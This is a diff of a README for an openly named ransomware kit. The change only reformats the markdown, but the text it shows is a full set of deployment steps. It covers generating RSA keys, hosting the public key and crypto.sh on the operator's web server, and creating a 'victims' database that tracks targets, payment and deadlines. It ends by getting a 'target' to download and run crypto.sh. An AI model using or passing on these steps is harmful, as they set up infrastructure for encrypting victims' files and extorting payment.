@@ -34,60 +34,56 @@
  - The codebase uses newer versions of software, like PHP. You may run into environments with older versions of PHP that do not support some of the built-in PHP functions. In this case, you will have to modify the code. Specifically, I ran into a PHP version that was < 5.2 and the DateTime function is not in that release.
  - To solve this, repleace the occurences of DateTime to the following:
  - # target.php
- ```php
- $expTime = time() + (2 * 24 * 60 * 60);
- $dateExpTime = strtotime($expTime);
- $expTime = date('Y-m-d H:i:s', $dateExpTime);
- ```
+   - `$expTime = time() + (2 * 24 * 60 * 60);`
+   - `$dateExpTime = strtotime($expTime);`
+   - `$expTime = date('Y-m-d H:i:s', $dateExpTime);`
  - # Or in one line:
- ```php
- $expTime = date('Y-m-d H:i:s', strtotime(time() + (2 * 24 * 60 * 60)));
- ```
+   - `$expTime = date('Y-m-d H:i:s', strtotime(time() + (2 * 24 * 60 * 60)));`
 
 ## What to do on the server-side
  - > Configure your comms over HTTPS
  - > Sample certs are in the sample_apache_conf directory
  - $ `openssl genrsa -des3 -passout pass:neveruseinsecurepasswords -out server.pass.key 4096`
- - $ openssl rsa -passin pass:neveruseinsecurepasswords -in server.pass.key -out server.key 
- - $ openssl req -new -key server.key -out server.csr
- - $ openssl x509 -req -days 4096 -in server.csr  -signkey server.key -out server.crt
- - $ chmod 600 server.*
- - $ mkdir /etc/ssl/certs/
- - $ mv server.key /etc/ssl/certs/
- - $ mv server.crt /etc/ssl/certs/
+ - $ `openssl rsa -passin pass:neveruseinsecurepasswords -in server.pass.key -out server.key`
+ - $ `openssl req -new -key server.key -out server.csr`
+ - $ `openssl x509 -req -days 4096 -in server.csr  -signkey server.key -out server.crt`
+ - $ `chmod 600 server.*`
+ - $ `mkdir /etc/ssl/certs/`
+ - $ `mv server.key /etc/ssl/certs/`
+ - $ `mv server.crt /etc/ssl/certs/`
  - > Use the sample apache SSL and Default configurations in sample_apache_conf as a guide
  - > Then configure your apache to redirect HTTP traffic to HTTPS
  - > Enable SSL
- - $ a2enmod ssl
- - $ servive apache2 restart
+ - $ `a2enmod ssl`
+ - $ `servive apache2 restart`
 
  - > Start Crypto Setup
- - $ openssl genrsa -out priv.pem 4096
- - $ openssl rsa -pubout -in priv.pem -out pub.pem
- - $ mkdir -p /var/www/html/downloads
- - $ cp pub.pem /var/www/html/downloads/
+   - $ `openssl genrsa -out priv.pem 4096`
+   - $ `openssl rsa -pubout -in priv.pem -out pub.pem`
+   - $ `mkdir -p /var/www/html/downloads`
+   - $ `cp pub.pem /var/www/html/downloads/`
  - > Modify crypto.sh and replace the IP with your web server's IP/URL
- - $ sed -i 's/192\.168\.1\.132/YYY\.YYY\.YYY\.YYY/g' crypto.sh # Where YYY.YYY.YYY.YYY is your IP
-     OR
- - $ sed -i 's/192\.168\.1\.132/www\.yourdomain\.com/g' crypto.sh
- - $ cp crypto.sh /var/www/html/downloads/
+   - $ `sed -i 's/192\.168\.1\.132/YYY\.YYY\.YYY\.YYY/g' crypto.sh` # Where YYY.YYY.YYY.YYY is your IP
+ - > OR
+   - $ `sed -i 's/192\.168\.1\.132/www\.yourdomain\.com/g' crypto.sh`
+   - $ `cp crypto.sh /var/www/html/downloads/`
  - > Copy all of the ransomware files to /var/www/html
  - > You should have all of the php files in the root of your web dir (/var/www/html/)
  - > You should also have /var/www/html/images/ and /var/www/html/scripts/
- - $ cd /var/www/html/
+   - $ `cd /var/www/html/`
  - > Modify admin.php, admin_query.php, decrypt.php, query.php, count.php, and target.php with your database information
- - $ chown -R www-data:root /var/www/html/
+   - $ `chown -R www-data:root /var/www/html/`
  - > Next, create the database for storing the data
- - $ mysql -u [user] -p
- - $ create database victims;
- - $ use victims;
- - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null, paid bool not null, paid_count timestamp not null);
- - $ exit
+   - $ `mysql -u [user] -p`
+   - $ `create database victims;`
+   - $ `use victims;`
+   - $ `create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null, paid bool not null, paid_count timestamp not null);`
+   - $ `exit`
 
 ## What to do on the client-side
  - Get target to download the file and execute or if you have have access to the system, download it directly
- - $ chmod 755 crypto.sh
- - $ ./crypto.sh &
+ - $ `chmod 755 crypto.sh`
+ - $ `./crypto.sh &`
 
 ## What it does
  - Downloads the public key from our server 
